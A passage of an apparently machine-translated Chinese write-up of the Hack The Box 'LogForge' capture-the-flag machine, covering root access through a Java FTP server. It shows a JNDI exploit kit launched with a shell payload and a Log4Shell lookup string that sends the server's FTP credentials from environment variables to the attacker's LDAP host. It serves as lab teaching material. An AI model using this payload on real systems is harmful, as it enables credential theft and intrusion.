kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Java FTP服务器</h1><p id="b2da" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">这告诉我们看起来有一个基于java的ftpserver在根文件夹中运行。我们可以在本地连接到它:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="71af" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ ftp localhost<br/>Connected to localhost.<br/>220 Welcome to the FTP-Server<br/>Name (localhost:tomcat): <br/>530 Not logged in<br/>Login failed.<br/>Remote system type is FTP.<br/>ftp&gt;</span></pre><p id="0c11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">奇怪的是，我刚刚在名称字段按了enter，它显示登录失败，但实际上我在:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="496d" class="nj km iq nf b gy nk nl l nm nn">ftp&gt; ls<br/>200 Command OK<br/>125 Opening ASCII mode data connection for file list.<br/>.profile<br/>.ssh<br/>snap<br/>ftpServer-1.0-SNAPSHOT-all.jar<br/>.bashrc<br/>.selected_editor<br/>run.sh<br/>.lesshst<br/>.bash_history<br/>root.txt<br/>.viminfo<br/>.cache<br/>226 Transfer complete.</span></pre><h1 id="ec4c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志(非预期)</h1><p id="55b8" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们看到了根旗。我可以得到它并完成这个盒子:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="56c3" class="nj km iq nf b gy nk nl l nm nn">ftp&gt; get root.txt<br/>local: root.txt remote: root.txt<br/>200 Command OK<br/>150 Opening ASCII mode data connection for requested file root.txt<br/>WARNING! 1 bare linefeeds received in ASCII mode<br/>File may not have transferred correctly.<br/>226 File transfer successful. Closing data connection.<br/>33 bytes received in 0.00 secs (86.8641 kB/s)<br/>ftp&gt; quit<br/>221 Closing connection<br/><br/>tomcat@LogForge:/tmp$ cat root.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="6c01" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">预期路径</h1><p id="130c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">事实证明这是无意的，所以为了按照Ippsec的计划完成这个盒子，让我们获取ftp服务器jar文件，并在Kali上查看它。</p><p id="4b70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们无法从/root中获得它，但是如果我们查看，我们会发现它在文件系统的其他地方:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="10f3" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ locate ftpServer-1.0-SNAPSHOT-all.jar<br/>/ftpServer-1.0-SNAPSHOT-all.jar<br/>/root/ftpServer-1.0-SNAPSHOT-all.jar</span></pre><p id="8618" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了进行渗透，我们可以在机器上启动Python web服务器:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f9d5" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/$ python3 -m http.server 1338<br/>Serving HTTP on 0.0.0.0 port 1338 (http://0.0.0.0:1338/) ...</span></pre><p id="98d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在把它从Kali那边拉过来:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nv"><img src="../Images/b1f10621309f128386c79e21a250fcbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*STt_RAOsZkP3rFlXPO2nqg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从盒子中取出ftpserver</figcaption></figure><h1 id="5f8a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JD-GUI</h1><p id="c565" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们可以反汇编jar文件，看看FTP服务器应用程序是如何工作的。有很多工具可以完成这项任务，包括<a class="ae lv" href="https://www.javatpoint.com/java-decompiler" rel="noopener ugc nofollow" target="_blank">这个</a>方便的在线工具，加上<a class="ae lv" href="https://www.javatpoint.com/java-decompiler" rel="noopener ugc nofollow" target="_blank">这篇</a>文章中提到的几个工具。对于Kali，我们可以使用JD-GUI，因为它包含在易于安装的存储库中:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c684" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# jd-gui<br/>Command 'jd-gui' not found, but can be installed with:<br/>apt install jd-gui<br/>Do you want to install it? (N/y)y<br/>apt install jd-gui<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following NEW packages will be installed:<br/>  jd-gui<br/>0 upgraded, 1 newly installed, 0 to remove and 314 not upgraded.<br/>Need to get 1,287 kB of archives.<br/>After this operation, 1500kB of additional disk space will be used.<br/>Get:1 http://kali.download/kali kali-rolling/main amd64 jd-gui all<br/>Fetched 1,287 kB in 1s (1,445 kB/s)<br/>Selecting previously unselected package jd-gui.<br/>Preparing to unpack .../jd-gui_1.6.6-0kali1_all.deb ...<br/>Unpacking jd-gui (1.6.6-0kali1) ...<br/>Setting up jd-gui (1.6.6-0kali1) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="3a58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在您的终端中键入jd-gui来打开应用程序。然后从文件菜单中选择打开文件，并选择我们复制的ftpServer-1.0-SNAPSHOT-all.jar:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/3710bab95a36ef3c47e9e6ace4944a1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:846/format:webp/0*5Gs4gh92_o00gh-D.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用JD-GUI反编译应用程序</figcaption></figure><p id="fc43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾四周，我们看到两件有趣的事情。首先，很明显log4j在这个FTP服务器中用于日志记录，因为你可以在类中看到许多配置文件和对它的引用。其次，在工人阶级中，我们看到:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/d1f21e1b31673bcf88722ee26678b8d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*GGcgc8xj4tS8ags8.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">检查worker.class揭示环境变量</figcaption></figure><p id="9714" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这告诉我们validUser和validPassword保存在名为ftp_user和ftp_password的环境变量中。<a class="ae lv" href="https://www.tutorialspoint.com/java/lang/system_getenv_string.htm" rel="noopener ugc nofollow" target="_blank">这</a>是一篇解释环境变量在Java中如何工作的好文章。</p><h1 id="a464" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTP JNDI漏洞1</h1><p id="b1db" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们可以像以前一样使用JNDI漏洞工具包来利用这一点来公开变量的值。检查它是否仍在运行，如果没有，请再次启动它:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="9820" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389</span></pre><p id="ba23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您不熟悉tshark，它是Wireshark的命令行版本。请看官方文档<a class="ae lv" href="https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html" rel="noopener ugc nofollow" target="_blank">这里</a>和<a class="ae lv" href="https://hackertarget.com/tshark-tutorial-and-filter-examples/" rel="noopener ugc nofollow" target="_blank">这个</a>给了我们几个例子来帮助理解如何使用它。</p><p id="d9ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动tshark来捕获网络上的流量，以备我们的流氓LDAP服务器响应它将从机器中接收的JNDI请求时使用:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="7230" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# tshark -i tun0 -w capture-output.pcap             <br/>Running as user "root" and group "root". This could be dangerous.<br/>Capturing on 'tun0'</span></pre><p id="2d5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在切换回盒子，启动ftp服务器，我们可以使用我们之前用来获取用户名和密码的JNDI字符串的变体:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="89bc" class="nj km iq nf b gy nk nl l nm nn">${jndi:ldap://10.10.14.12:389/PENCER--USER:${env:ftp_user}:PASSWORD:${env:ftp_password}}</span></pre><p id="a5bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当FTP在机器上启动时，只需将它粘贴到名称字段中:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ny"><img src="../Images/a2a307c1f5bf613f0c242994bb036f01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lYm0iAVtxF7zPLwMvsVWFQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">利用JNDI漏洞暴露环境变量</figcaption></figure><p id="c796" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那个JNDI字符串将像以前一样回调我们在端口389上的Kali LDAP服务器，这次它为ftp_user和ftp_password传递环境变量。当它们被传递给我们时，它们将被转换成这些变量的实际值，这样我们就可以看到它们是什么了。</p><p id="e81a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换回tshark和ctrl-z以停止捕获，然后我们可以读取pcap文件并过滤tcp.port == 389以查看LDAP流量:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nz"><img src="../Images/dd2d9dde56f1c9cec7d78b223a2266a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*muHcJAo3snRptRySy0AUHg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">tshark捕获环境变量的内容以揭示凭证</figcaption></figure><p id="e637" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过将PENCER放入字符串中，我们可以很容易地在输出中看到它。我们还可以grep来显示我们感兴趣的行:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi oa"><img src="../Images/835943e43f412d007c31d338fa81d6f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vOASdQ9_CL9cq4VkOcIipw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">tshark的Grepped输出便于查看</figcaption></figure><p id="ad86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们找到了用户名和密码。我们现在可以切换回机器，正确登录并再次获得根标志:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="78f3" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/tmp$ ftp localhost<br/>Connected to localhost.<br/>220 Welcome to the FTP-Server<br/>Name (localhost:tomcat): ippsec<br/>331 User name okay, need password<br/>Password:<br/>230-Welcome to HKUST<br/>230 User logged in successfully<br/>Remote system type is FTP.<br/>ftp&gt; get root.txt<br/>local: root.txt remote: root.txt<br/>200 Command OK<br/>150 Opening ASCII mode data connection for requested file root.txt<br/>WARNING! 1 bare linefeeds received in ASCII mode<br/>File may not have transferred correctly.<br/>226 File transfer successful. Closing data connection.<br/>33 bytes received in 0.00 secs (49.5032 kB/s)<br/>ftp&gt; exit<br/>221 Closing connection<br/>tomcat@LogForge:/tmp$ cat root.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="2914" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTP JNDI漏洞2</h1><p id="66f6" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们还可以做另外一件事，而不是使用tshark来捕获流氓LDAP服务器作为有效负载发送的流量。这实际上要容易得多，我们只需在389端口监听JNDI漏洞利用工具包，但没有有效载荷。使用与之前相同的JNDI查询作为FTP用户名，当您切换回Kali时，您会看到我们有我们想要的:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ob"><img src="../Images/14ff8931d0cff7a32036f794d48ac77f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zZrH_JS9eojpqOf8vrncxA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDI漏洞工具包暴露凭据</figcaption></figure><p id="5a94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你所看到的，当它从盒子里收到JNDI字符串时，它不知道如何处理它，因为没有设置有效载荷来响应。有益的是，它向我们显示了收到的内容，包括那些扩展的变量，这样我们就可以看到它们的内容。</p><p id="c4ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是在这个盒子上获得根标志的三种方法。希望你喜欢，下次见。</p></div><div class="ab cl oc od hu oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="ij ik il im in"><p id="14ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="8822" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae lv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae lv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="bb99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oj">原载于2022年1月2日</em><a class="ae lv" href="https://pencer.io/ctf/ctf-htb-logforge/" rel="noopener ugc nofollow" target="_blank"><em class="oj">https://pencer . io</em></a><em class="oj">。</em></p></div></div>    
</body>
</html>